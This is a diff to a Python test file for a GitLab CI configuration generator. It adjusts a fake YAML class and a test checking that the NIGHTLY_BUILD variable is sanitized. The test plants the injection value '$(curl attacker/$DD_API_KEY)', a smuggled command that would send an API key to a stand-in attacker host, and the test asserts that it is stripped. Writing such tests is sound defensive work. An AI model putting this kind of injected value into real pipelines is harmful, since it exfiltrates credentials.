@@ -21,6 +21,12 @@ def gen_gitlab_config_mod():
     yaml = types.ModuleType("ruamel.yaml")
 
     class YAML:
+        def __enter__(self):
+            return self
+
+        def __exit__(self, *_args):
+            return None
+
         def load(self, content):
             return {"variables": {"TESTRUNNER_IMAGE": "testrunner:fake"}}
 
@@ -64,8 +70,7 @@ def test_get_bool_env_only_allows_literal_true(gen_gitlab_config_mod, monkeypatc
 def test_jobspec_sanitizes_nightly_build_before_script(gen_gitlab_config_mod, monkeypatch):
     monkeypatch.setenv("NIGHTLY_BUILD", "$(curl attacker/$DD_API_KEY)")
 
-    with mock.patch.object(gen_gitlab_config_mod.subprocess, "check_output", return_value=b"pip-key\n"):
-        config = str(gen_gitlab_config_mod.JobSpec(name="suite", stage="core"))
+    config = str(gen_gitlab_config_mod.JobSpec(name="suite", stage="core"))
 
     assert '    - export NIGHTLY_BUILD="false"' in config
     assert "$(curl" not in config
